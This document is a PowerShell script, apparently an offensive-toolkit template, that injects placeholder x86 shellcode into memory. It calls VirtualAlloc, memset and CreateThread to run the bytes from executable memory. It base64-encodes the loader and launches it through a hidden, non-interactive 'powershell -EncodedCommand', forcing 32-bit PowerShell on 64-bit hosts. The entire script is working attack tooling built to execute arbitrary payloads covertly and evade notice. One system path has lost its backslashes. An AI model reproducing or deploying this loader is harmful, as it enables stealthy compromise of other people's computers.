# our execute x86 shellcode
function Generate-ShellcodeExec
{
# this is our shellcode injection into memory (one liner)
$shellcode_string = @"
`$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';`$winFunc = Add-Type -memberDefinition `$code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]`$sc64 = SHELLCODE
;[Byte[]]`$sc = `$sc64;`$size = 0x1000;if (`$sc.Length -gt 0x1000) {`$size = `$sc.Length};`$x=`$winFunc::VirtualAlloc(0,0x1000,`$size,0x40);for (`$i=0;`$i -le (`$sc.Length-1);`$i++) {`$winFunc::memset([IntPtr](`$x.ToInt32()+`$i), `$sc[`$i], 1)};`$winFunc::CreateThread(0,0,`$x,0,0,0);for (;;) { Start-sleep 60 };
"@
$goat =  [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string)) 
write-output $goat
}

# our function for executing x86 shellcode
function Execute-x86
{
	# if we are running under AMD64 then use the x86 version of powershell
    if($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
    {
        $powershellx86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell.exe"
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		$thegoat = Generate-ShellcodeExec
        iex "& $powershellx86 $cmd $thegoat"
		
    }
	# else just run normally
    else
    {
        $thegoat = Generate-ShellcodeExec
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		iex "& powershell $cmd $thegoat"
    }
}
# call the function
Execute-x86
